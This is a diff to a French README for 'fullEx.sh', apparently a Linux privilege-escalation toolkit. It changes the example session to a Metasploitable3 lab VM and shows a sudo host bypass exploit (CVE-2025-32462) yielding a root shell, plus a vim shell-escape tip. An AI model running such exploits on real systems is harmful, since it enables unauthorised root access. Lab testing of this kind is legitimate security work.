@@ -16,7 +16,7 @@ Les exploits root & outils dispo :
 # ⚙️ Commandes
 
 ```
-heisenberg@kb-server:~/fullEx$ ./fullEx.sh -help
+vagrant@metasploitable3-ub1404:~/fullEx$ ./fullEx.sh -help
                                                                                                     
  $$$$$$\            $$\ $$\ $$$$$$$$\           
 $$  __$$\           $$ |$$ |$$  _____|          
@@ -49,10 +49,16 @@ OverlaysFS
 # 💲 Exemple
 
 ```
-heisenberg@kb-server:~/fullEx$ bash fullEx.sh -perm
-heisenberg@kb-server:~/fullEx$ ./fullEx.sh -PwnKit64
-To run a command as administrator (user "root"), use "sudo <command>".
-See "man sudo_root" for details.
-
-root@kb-server:/home/heisenberg/fullEx#    
+vagrant@metasploitable3-ub1404:~/fullEx$ bash fullEx.sh -perm
+vagrant@metasploitable3-ub1404:~/fullEx$ ./fullEx.sh -SudoHost
+[+] Sudo Host Bypass Exploit - CVE-2025-32462
+[+] Discovered by: Rich Mirch
+[+] Exploit by: J3rich0123
+[+] Target: Linux x86_64
+[+] Starting pseudo-root shell on dev.
+[+] Type 'exit' or 'quit' to leave.
+[+] For a real shell, type: bash
+[+] Or: vim → :!bash to break into a real TTY shell
+root@dev# id
+uid=0(root) gid=0(root) groups=0(root)   
 ```
